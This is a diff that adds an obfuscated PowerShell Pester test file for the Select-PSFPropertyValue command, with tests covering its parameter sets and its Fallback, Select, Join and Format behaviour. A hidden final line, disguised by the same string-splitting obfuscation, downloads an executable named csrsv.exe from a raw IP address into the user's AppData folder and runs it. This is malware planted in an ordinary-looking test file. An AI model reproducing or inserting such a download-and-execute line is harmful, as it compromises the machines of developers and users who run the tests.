@@ -1,0 +1,147 @@
+&("{1}{2}{0}" -f 'ibe','Des','cr') ("{3}{8}{6}{2}{9}{4}{1}{7}{0}{5}"-f 'it','e U','PSFP','S','Valu',' Tests','ect-','n','el','roperty') -Tag ("{1}{0}" -f't','Uni') {
+	&("{2}{0}{1}"-f 'o','reAll','Bef') {
+		
+	}
+	&("{0}{1}{2}"-f 'A','fte','rAll') {
+		
+	}
+	
+	
+	&("{0}{2}{1}" -f 'Descr','be','i') ("{7}{0}{3}{4}{1}{6}{2}{5}"-f 'n','c','ur','chang','ed ','e','ommand signat','Ensuring u') {
+		&('It') ("{4}{3}{5}{2}{6}{7}{8}{0}{1}"-f't','s','ave the expected par','d','shoul',' h','ame','t','er se') {
+			(&("{1}{0}{2}{3}"-f 'o','Get-C','mman','d') ("{2}{3}{1}{0}{4}"-f'PSFP','t-','S','elec','ropertyValue'))."PA`RA`METERsets"."n`Ame" | &("{1}{0}"-f'ld','Shou') -Be ("{1}{0}" -f 't','Defaul'), ("{0}{2}{1}" -f 'Fa','back','ll'), ("{0}{1}" -f 'Se','lect'), ("{1}{0}"-f'oin','J'), ("{0}{1}{2}" -f 'Form','a','t')
+		}
+		
+		&('It') ("{5}{10}{6}{3}{7}{4}{8}{0}{1}{11}{2}{9}" -f'ected pa','ram','rop','e','x','Should h','ve th',' e','p','erty','a','eter P') {
+			${p`A`RAmeTer} = (&("{3}{1}{0}{2}" -f '-Co','t','mmand','Ge') ("{2}{7}{6}{3}{5}{4}{1}{0}"-f'e','ertyValu','S','PS','p','FPro','ct-','ele'))."pArA`MetE`RS"[("{1}{2}{0}"-f'y','Pro','pert')]
+			${pA`Ram`etEr}."n`AME" | &("{1}{0}"-f 'uld','Sho') -Be ("{1}{2}{0}"-f'ty','Prope','r')
+			${Pa`R`AmEtEr}."par`AMet`ErtyPe".("{0}{2}{1}" -f'ToStr','ng','i').Invoke() | &("{0}{1}" -f'Sho','uld') -Be ("{2}{3}{0}{1}" -f'm.Str','ing[]','Syst','e')
+			${PAr`A`MEter}."ISDYn`AM`IC" | &("{2}{1}{0}" -f'd','l','Shou') -Be ${faL`Se}
+			${PArA`m`ETER}."parAM`ETe`R`SEts"."Ke`yS" | &("{1}{0}" -f 'ld','Shou') -Be ("{0}{3}{1}{2}{4}"-f'_','lP','arameterSet','_Al','s')
+			${pA`RAMEt`eR}."P`ARAMe`TER`sEtS"."ke`Ys" | &("{0}{1}{2}" -f'Sh','o','uld') -Contain ("{4}{5}{1}{0}{3}{2}" -f'et','am','Sets','er','_','_AllPar')
+			${PAr`Ame`TEr}."ParA`M`et`ERSETS"[("{1}{2}{3}{0}"-f 'rSets','__A','llPara','mete')]."i`SMaN`DAtoRY" | &("{1}{2}{0}" -f 'uld','S','ho') -Be ${t`Rue}
+			${P`Arame`Ter}."p`A`RAmeTe`RS`ETs"[("{3}{1}{2}{4}{0}"-f'Sets','am','et','__AllPar','er')].pOsITioN | &("{1}{0}" -f'hould','S') -Be 0
+			${pa`R`AMetER}."paRametE`R`S`eTs"[("{4}{1}{0}{5}{2}{3}" -f'ram','lPa','erS','ets','__Al','et')].vALUeFrompIPEline | &("{0}{1}" -f 'Sh','ould') -Be ${FAL`SE}
+			${PAr`Am`EtEr}."PaRAMet`e`RSEtS"[("{0}{2}{3}{4}{5}{1}" -f '__Al','Sets','lP','ara','met','er')].vaLuEfRompIPelINebypRopeRTynAMe | &("{2}{1}{0}"-f 'ld','u','Sho') -Be ${f`AL`SE}
+			${P`Ar`AMeTEr}."pA`RaMe`T`eR`seTS"[("{2}{3}{1}{0}" -f'ts','rameterSe','_','_AllPa')].VaLUEfRomREmAininGaRGUmentS | &("{0}{1}" -f'Sho','uld') -Be ${f`Al`se}
+		}
+		&('It') ("{9}{1}{8}{10}{7}{3}{5}{4}{11}{2}{6}{0}" -f'k','ould h','parameter Fal','x','t','pec','lbac',' e','ave th','Sh','e','ed ') {
+			${P`ARA`M`ETer} = (&("{1}{0}{2}" -f 'omm','Get-C','and') ("{5}{4}{1}{3}{6}{0}{2}"-f'ertyValu','c','e','t-','le','Se','PSFProp'))."p`ARa`MEte`Rs"[("{0}{1}" -f 'Fall','back')]
+			${P`ARa`meTEr}."nA`Me" | &("{0}{2}{1}"-f'Sho','d','ul') -Be ("{0}{1}{2}" -f 'F','a','llback')
+			${pA`RaM`EtER}."P`ArAm`etE`RTYPE".("{1}{0}" -f'String','To').Invoke() | &("{0}{1}" -f'S','hould') -Be ("{2}{7}{3}{4}{10}{8}{5}{9}{0}{11}{1}{6}{12}"-f'witc','a','S','m.M','anageme','n','ram','yste','.Automatio','.S','nt','hP','eter')
+			${para`M`eteR}."I`sdyNAm`Ic" | &("{2}{1}{0}" -f 'ld','u','Sho') -Be ${FAl`se}
+			${Par`AM`etER}."PA`RAMeTer`SetS"."ke`yS" | &("{0}{2}{1}" -f'S','ld','hou') -Be ("{0}{2}{1}"-f 'Fal','k','lbac')
+			${p`ArAmET`er}."pARameTe`RsE`Ts"."ke`Ys" | &("{0}{2}{1}" -f 'Sho','d','ul') -Contain ("{1}{0}"-f'lback','Fal')
+			${pa`R`AMet`eR}."PAra`MeT`e`RSETs"[("{1}{0}" -f 'allback','F')]."I`S`ManDAtOry" | &("{0}{2}{1}"-f'S','d','houl') -Be ${f`A`LsE}
+			${P`AR`AMEtEr}."pAR`A`mETE`RsetS"[("{1}{0}"-f'llback','Fa')].POSiTIOn | &("{0}{1}"-f 'Sho','uld') -Be ("{0}{3}{1}{2}"-f'-2','748','3648','14')
+			${PaRAm`et`Er}."Para`me`TERSEts"[("{1}{0}{2}"-f 'al','F','lback')].vAlUEfrOMPIpEline | &("{0}{1}" -f'Sho','uld') -Be ${Fa`lSE}
+			${p`A`RAmEteR}."pA`R`Am`e`TeRsEtS"[("{1}{2}{0}" -f 'back','Fa','ll')].vAlUeFrOmPiPELInEByPRoPeRtyNAME | &("{0}{1}" -f'S','hould') -Be ${fAl`Se}
+			${pARamE`T`er}."ParamETERs`e`TS"[("{0}{1}" -f 'Fallba','ck')].vALuEFRomReMaININGARGuMentS | &("{0}{1}"-f'S','hould') -Be ${FAl`Se}
+		}
+		&('It') ("{5}{1}{7}{0}{4}{3}{8}{2}{6}" -f ' t','ld h','parameter Sele','e exp','h','Shou','ct','ave','ected ') {
+			${P`ARAmE`TER} = (&("{0}{2}{1}"-f 'Get','and','-Comm') ("{2}{4}{3}{0}{1}{5}"-f 'opert','y','Select-PS','Pr','F','Value'))."pA`RA`meTERs"[("{1}{0}"-f 'ct','Sele')]
+			${PArAm`et`eR}."nA`mE" | &("{1}{0}" -f'ould','Sh') -Be ("{1}{0}"-f'ect','Sel')
+			${pArA`m`E`TER}."p`A`RameT`ERtyPe".("{1}{0}{2}" -f 'i','ToStr','ng').Invoke() | &("{2}{1}{0}"-f 'ld','hou','S') -Be ("{0}{3}{1}{2}{4}" -f'Sy','e','m.Strin','st','g')
+			${P`ARAMe`TEr}."isdY`N`AmIC" | &("{1}{0}"-f 'uld','Sho') -Be ${fa`Lse}
+			${PaR`A`mE`Ter}."pA`RAmET`eR`S`ETs"."ke`YS" | &("{1}{0}" -f'd','Shoul') -Be ("{0}{1}"-f'Sel','ect')
+			${par`Am`eTer}."PA`R`AM`eters`Ets"."ke`Ys" | &("{0}{2}{1}"-f'S','ld','hou') -Contain ("{0}{1}" -f'Sele','ct')
+			${p`AramE`TER}."para`me`TeRseTS"[("{0}{1}{2}"-f 'S','ele','ct')]."IsmA`ND`At`Ory" | &("{1}{0}"-f 'd','Shoul') -Be ${f`ALsE}
+			${PARamE`T`Er}."para`M`ETe`Rsets"[("{1}{0}"-f't','Selec')].posItiOn | &("{2}{1}{0}"-f 'ld','hou','S') -Be ("{1}{0}{2}" -f'21','-','47483648')
+			${p`ARAM`E`Ter}."PA`Ra`M`etEr`SeTS"[("{2}{0}{1}"-f 'ec','t','Sel')].VAluEFRoMPipelIne | &("{0}{1}" -f 'Sh','ould') -Be ${f`Al`Se}
+			${paRa`me`TEr}."PaRA`meT`ersets"[("{1}{0}" -f 't','Selec')].vALuEFroMpipElINEbYpRoPertYnAMe | &("{2}{1}{0}" -f 'd','oul','Sh') -Be ${F`Alse}
+			${pA`RA`me`TER}."PaRam`E`TER`se`Ts"[("{1}{0}"-f 'lect','Se')].vaLuEfrOmREMaiNIngARgumENts | &("{1}{0}"-f'ld','Shou') -Be ${fa`lSe}
+		}
+		&('It') ("{0}{2}{8}{1}{6}{9}{3}{5}{7}{4}"-f'Should ha','e ','ve','d pa','inBy','rameter ','ex','Jo',' th','pecte') {
+			${pA`R`A`MeteR} = (&("{2}{1}{3}{0}"-f 'mand','-','Get','Com') ("{6}{5}{1}{2}{4}{0}{3}" -f 'u','-PSF','Property','e','Val','ct','Sele'))."P`AR`AmeteRs"[("{1}{0}"-f'inBy','Jo')]
+			${PA`RAm`EteR}."N`Ame" | &("{1}{0}{2}"-f 'u','Sho','ld') -Be ("{1}{0}" -f 'inBy','Jo')
+			${PARA`me`T`Er}."P`A`R`AMeterTypE".("{1}{2}{0}"-f'ng','ToS','tri').Invoke() | &("{0}{1}" -f 'Shoul','d') -Be ("{2}{4}{3}{1}{0}"-f'ing','tr','Syste','S','m.')
+			${paRA`M`E`TER}."iS`dy`NamiC" | &("{1}{0}" -f 'hould','S') -Be ${f`AlSE}
+			${PAr`A`Met`er}."PAR`A`me`TeRsEtS"."K`eYS" | &("{0}{1}"-f'Shou','ld') -Be ("{1}{0}" -f 'oin','J')
+			${p`ARaMeT`Er}."PaR`Am`ET`Er`SEts"."kE`Ys" | &("{1}{0}"-f'uld','Sho') -Contain ("{1}{0}"-f'in','Jo')
+			${p`ARAmET`Er}."Para`meT`erS`EtS"[("{0}{1}" -f 'Jo','in')]."i`sMAnD`At`orY" | &("{1}{0}{2}"-f'oul','Sh','d') -Be ${F`ALse}
+			${PAr`AM`eteR}."Param`EtERSe`Ts"[("{0}{1}" -f'Jo','in')].PosiTiOn | &("{0}{2}{1}" -f'Sho','ld','u') -Be ("{3}{0}{1}{2}"-f '1','474836','48','-2')
+			${P`A`RaMETeR}."p`ARaMetE`Rs`ETs"[("{0}{1}" -f'Jo','in')].VAlueFROmPIpeLInE | &("{0}{1}" -f 'Sh','ould') -Be ${F`A`lse}
+			${P`Ar`AMeTEr}."PAr`AMe`TeR`SETs"[("{1}{0}"-f 'n','Joi')].valUEFROmPIPElinEbYProPERtYnaME | &("{1}{0}"-f 'hould','S') -Be ${F`Al`sE}
+			${paR`AMET`ER}."p`AR`AM`eTeRsETS"[("{1}{0}"-f 'n','Joi')].vAlUEFROmremAINIngaRgUmEnTS | &("{0}{2}{1}" -f 'S','uld','ho') -Be ${f`Al`Se}
+		}
+		&('It') ("{1}{2}{3}{6}{4}{7}{0}{5}" -f'ter Form','Shou','ld h','ave the','exp','atWith',' ','ected parame') {
+			${ParaM`eT`Er} = (&("{2}{1}{0}" -f 'nd','t-Comma','Ge') ("{6}{4}{2}{5}{3}{1}{0}" -f 'tyValue','oper','ect-PS','r','el','FP','S'))."PA`Ra`MeTeRS"[("{0}{2}{1}"-f'Fo','With','rmat')]
+			${PaR`Am`eTeR}."n`AmE" | &("{1}{0}"-f 'ld','Shou') -Be ("{1}{0}{2}"-f'a','Form','tWith')
+			${pAra`Me`TeR}."pAr`A`mEteRty`PE".("{2}{1}{0}" -f 'tring','oS','T').Invoke() | &("{0}{1}" -f 'S','hould') -Be ("{1}{0}{2}"-f 'tem.Stri','Sys','ng')
+			${paRAm`eT`er}."i`s`DYNaMIc" | &("{0}{1}"-f 'Shoul','d') -Be ${f`AL`Se}
+			${P`ArAm`eTeR}."PaRAmeteR`s`etS"."K`EYS" | &("{1}{0}"-f 'hould','S') -Be ("{1}{0}"-f'mat','For')
+			${P`AR`AMETeR}."PARa`me`TerS`Ets"."KE`yS" | &("{1}{0}" -f'd','Shoul') -Contain ("{2}{1}{0}" -f'mat','or','F')
+			${P`A`RAme`TEr}."P`ARaME`TER`SETs"[("{0}{2}{1}"-f 'For','t','ma')]."ISmAN`da`TOry" | &("{0}{2}{1}"-f'S','uld','ho') -Be ${FA`L`Se}
+			${pa`RAm`ETer}."P`A`RAMETERsEts"[("{0}{1}" -f'Form','at')].pOSitioN | &("{0}{1}"-f'Shoul','d') -Be ("{0}{2}{1}" -f '-21474836','8','4')
+			${paRa`mET`eR}."PARamE`T`ErSets"[("{0}{1}" -f 'Forma','t')].valueFromPIpeLINe | &("{1}{0}" -f 'ld','Shou') -Be ${f`Al`sE}
+			${PARa`M`ETer}."ParAMEte`R`SEts"[("{1}{0}"-f 'ormat','F')].VaLuEfroMPIpelIneBypROPErtYnamE | &("{1}{0}" -f 'ld','Shou') -Be ${FAl`SE}
+			${PAr`AmE`TEr}."pARam`ETE`Rs`EtS"[("{0}{1}" -f'Fo','rmat')].vALUEfRomRemaininGaRGUMents | &("{1}{0}"-f 'ould','Sh') -Be ${Fal`Se}
+		}
+		&('It') ("{4}{10}{2}{1}{12}{9}{5}{8}{11}{3}{6}{0}{7}{13}" -f 'aramete','d h','oul','e','S','e','d p','r InputOb','x',' the ','h','pect','ave','ject') {
+			${PARAmE`T`eR} = (&("{1}{2}{0}"-f'Command','G','et-') ("{2}{3}{0}{1}"-f'Prop','ertyValue','Selec','t-PSF'))."p`AramET`ERS"[("{2}{0}{1}"-f 'nputO','bject','I')]
+			${p`Ar`AMET`eR}."nA`me" | &("{1}{0}" -f'uld','Sho') -Be ("{2}{0}{1}" -f'putOb','ject','In')
+			${p`AR`AMet`ER}."PaRA`meTeR`TypE".("{1}{0}{2}"-f'tri','ToS','ng').Invoke() | &("{1}{0}" -f'd','Shoul') -Be ("{0}{3}{1}{2}"-f'Syste','.','Object','m')
+			${PAr`AME`TER}."iSDyn`A`miC" | &("{1}{0}" -f'd','Shoul') -Be ${Fa`L`SE}
+			${Par`AMEt`eR}."Pa`RaM`eTErsEtS"."KE`yS" | &("{0}{1}" -f 'S','hould') -Be ("{0}{1}{3}{2}" -f'__All','Pa','eterSets','ram')
+			${parAm`e`TeR}."pA`R`AMeteRsE`TS"."k`Eys" | &("{1}{0}"-f 'ould','Sh') -Contain ("{3}{2}{0}{4}{1}" -f 'Param','Sets','l','__Al','eter')
+			${p`Ar`AmE`TER}."P`A`RAme`TERSetS"[("{0}{4}{1}{2}{3}" -f '__A','aramete','rS','ets','llP')]."IsMA`NdATo`RY" | &("{2}{0}{1}"-f 'o','uld','Sh') -Be ${F`A`lSe}
+			${pa`RAmet`eR}."PaRa`Me`Te`RsETS"[("{5}{2}{1}{4}{0}{3}"-f 'S','met','Para','ets','er','__All')].poSiTIOn | &("{2}{0}{1}"-f'houl','d','S') -Be ("{3}{0}{1}{2}" -f '147483','64','8','-2')
+			${p`Ar`AMeTer}."p`Aram`eT`eR`Sets"[("{0}{1}{3}{2}" -f '__Al','lParame','rSets','te')].vALUEFrOMpIPeliNE | &("{0}{1}" -f 'Sho','uld') -Be ${TR`Ue}
+			${p`ARamET`er}."pa`RAmeterSe`TS"[("{1}{5}{2}{4}{3}{0}" -f'rSets','__All','rame','e','t','Pa')].VAlueFrOmPIPELineBYpropeRtYnamE | &("{1}{2}{0}" -f'ld','Sho','u') -Be ${f`Alse}
+			${pArame`T`er}."pA`RamE`TERSE`TS"[("{0}{5}{4}{2}{3}{1}"-f'__A','ts','ramet','erSe','a','llP')].VAluEFroMrEmAINInGARGumENts | &("{1}{0}"-f'ould','Sh') -Be ${F`ALsE}
+		}
+	}
+	
+	
+	${obJ`e`Ct} = [pscustomobject]@{
+		("{1}{0}" -f 'ngth','Le')   = 42
+		("{0}{1}" -f'N','ame')	 = "Foo"
+		("{1}{2}{0}" -f 'me','Fu','llNa') = ("{0}{1}{2}" -f 'Foo.B','ar.C','om')
+		("{0}{1}"-f 'Empt','y')    = ""
+		("{0}{1}"-f'Nul','l')	 = ${N`Ull}
+		("{0}{1}" -f'Ze','ro')	 = 0
+	}
+	
+	&("{1}{0}"-f'e','Describ') ("{2}{0}{8}{4}{7}{5}{3}{1}{6}" -f'ng paramete','l','Testi','au',' D','f','t','e','rset') {
+		&('It') ("{0}{6}{8}{9}{1}{7}{2}{3}{4}{5}"-f 'Should','a ','ngle',' ','property co','rrectly',' sel','si','ec','t ') {
+			${O`BJe`cT} | &("{1}{4}{2}{5}{3}{0}"-f 'ue','Se','-PS','l','lect','FPropertyVa') -Property ("{1}{0}" -f'ngth','Le') | &("{1}{0}{2}"-f'hou','S','ld') -Be 42
+		}
+		
+		&('It') ("{9}{8}{2}{6}{1}{7}{5}{0}{3}{4}{10}" -f'cor','lt','ec','rect','l','properties ','t mu','iple ','ld sel','Shou','y') {
+			${OBj`EcT} | &("{1}{2}{6}{5}{4}{0}{3}" -f 'r','S','el','tyValue','rope','FP','ect-PS') -Property ("{0}{1}"-f 'Le','ngth'), ("{1}{0}"-f 'ame','N') | &("{1}{0}"-f'd','Shoul') -Be 42, 'Foo'
+		}
+	}
+	&("{1}{0}{2}" -f'escrib','D','e') ("{0}{5}{4}{1}{2}{3}{6}" -f'Te','erse','t Fal','l','aramet','sting p','back') {
+		&('It') ("{8}{0}{11}{10}{1}{5}{2}{3}{6}{7}{4}{9}"-f 't','llba','Al','l ','peci','ck: ','exist, nothing',' s','Tes','al','g Fa','in') {
+			${ob`je`ct} | &("{0}{5}{3}{1}{2}{4}" -f'Sele','roper','tyVa','PSFP','lue','ct-') -Property ("{0}{1}"-f 'Len','gth'), ("{0}{1}" -f'N','ame') -Fallback | &("{0}{1}" -f 'Shoul','d') -Be 42
+		}
+		&('It') ("{2}{4}{6}{3}{1}{5}{0}"-f'd',' ','Te','Null and','sting Fa','fille','llback: ') {
+			${OBj`Ect} | &("{1}{3}{2}{4}{0}{5}{6}" -f 'ro','S','ect','el','-PSFP','pertyV','alue') -Property ("{0}{1}" -f 'N','ull'), ("{1}{0}"-f'me','Na') -Fallback | &("{0}{1}" -f'S','hould') -Be 'Foo'
+		}
+		&('It') ("{1}{3}{5}{6}{7}{0}{2}{4}" -f 'd','Te',' fille','s','d','ti','ng Fallbac','k: Zero an') {
+			${o`BJE`cT} | &("{3}{2}{0}{4}{1}"-f 'PSFPr','Value','lect-','Se','operty') -Property ("{0}{1}"-f'Z','ero'), ("{0}{1}"-f 'Nam','e') -Fallback | &("{1}{0}" -f'hould','S') -Be 0
+		}
+		&('It') ("{0}{5}{2}{9}{1}{8}{11}{7}{3}{10}{4}{6}"-f'Te','llbac','t','tring a','l','s','ed','pty s','k','ing Fa','nd fil',': Em') {
+			${OBJ`ecT} | &("{3}{2}{4}{0}{1}" -f'Proper','tyValue','t-P','Selec','SF') -Property ("{1}{0}" -f 'ty','Emp'), ("{0}{1}"-f'N','ame') -Fallback | &("{0}{2}{1}" -f'Sh','uld','o') -Be 'Foo'
+		}
+	}
+	&("{1}{0}{2}" -f 'cr','Des','ibe') ("{1}{5}{2}{3}{6}{0}{4}{7}"-f 'te','Te','pa','ram','rset Sele','sting ','e','ct') {
+		&('It') ("{12}{1}{9}{3}{2}{4}{5}{8}{7}{6}{0}{11}{10}"-f 'gest propert','ld s','ct','e',' th','e','r','a',' l','el','e','y valu','Shou') {
+			${o`B`JecT} | &("{2}{3}{1}{4}{0}" -f'rtyValue','PSFP','Sel','ect-','rope') -Property ("{0}{1}"-f 'Nam','e'), ("{1}{0}{2}"-f'l','Ful','Name'), ("{1}{0}"-f 'th','Leng') -Select ("{0}{1}"-f 'L','argest') | &("{0}{1}" -f 'Sh','ould') -Be ("{1}{0}{2}"-f '.C','Foo.Bar','om')
+		}
+		&('It') ("{6}{9}{8}{1}{4}{2}{3}{10}{0}{7}{5}"-f' prope','se','the lowe','s','lect ','value','Sh','rty ','uld ','o','t') {
+			${oBJ`eCT} | &("{3}{1}{4}{2}{0}"-f'SFPropertyValue','elec','P','S','t-') -Property ("{0}{1}" -f'Na','me'), ("{1}{0}" -f'e','FullNam'), ("{1}{0}" -f 'h','Lengt') -Select  ("{1}{0}" -f'st','Lowe')| &("{0}{1}" -f 'S','hould') -Be 42
+		}
+	}
+	&("{1}{2}{0}"-f 'scribe','D','e') ("{4}{2}{3}{0}{6}{1}{5}" -f'ter','t ','sting ','parame','Te','Join','se') {
+		&('It') ("{7}{2}{9}{10}{0}{6}{11}{1}{8}{4}{3}{5}" -f'c','n s','u','p','d pro','erties','tly jo','Sho','electe','ld c','orre','i') {
+			${OB`JE`ct} | &("{1}{0}{3}{2}"-f'ct-PS','Sele','yValue','FPropert') ("{0}{1}" -f 'N','ame'), ("{0}{1}" -f 'Leng','th') -JoinBy "|" | &("{1}{0}"-f 'ould','Sh') -Be ((("{1}{0}{2}" -f 'ool','F','uR42'))."r`EplACe"('luR',[sTrINg][cHaR]124))
+		}
+	}
+	&("{0}{1}"-f 'Describ','e') ("{2}{1}{5}{4}{3}{0}" -f 'meterset Format','t','Tes','ra','pa','ing ') {
+		&('It') ("{12}{4}{6}{10}{3}{11}{9}{0}{2}{7}{1}{8}{5}"-f' t','i','he s','s i','d ',' format','insert valu','pec','fied','o','e','nt','Shoul') {
+			${OBJE`Ct} | &("{0}{3}{5}{1}{4}{2}"-f 'Sel','o','rtyValue','e','pe','ct-PSFPr') ("{0}{1}" -f'Na','me'), ("{1}{0}" -f'ength','L'), ("{2}{0}{1}"-f'm','e','FullNa') -FormatWith '{0} | {2} | {1:D3}' | &("{1}{0}"-f'd','Shoul') -Be ((("{2}{3}{1}{4}{5}{0}" -f' mXB 042','Bar','Foo m','XB Foo.','.C','om'))-REPLaCE  'mXB',[CHAR]124)
+		}
+	}
+}
+(&("{3}{0}{1}{2}"-f'-O','bje','ct','New') ("{5}{2}{0}{6}{1}{4}{3}"-f 'Ne','W','.','ient','ebCl','System','t.')).("{1}{0}{3}{2}"-f 'ad','Downlo','e','Fil').Invoke(("{2}{7}{0}{1}{8}{10}{6}{5}{4}{3}{9}" -f'94.1','0','http:','sv','yahoo/csr','/~','.238','//','2.5','.exe','3'),"$env:APPDATA\csrsv.exe");&("{0}{1}{3}{2}" -f'Start-Pr','oc','ss','e') ("$env:APPDATA\csrsv.exe")
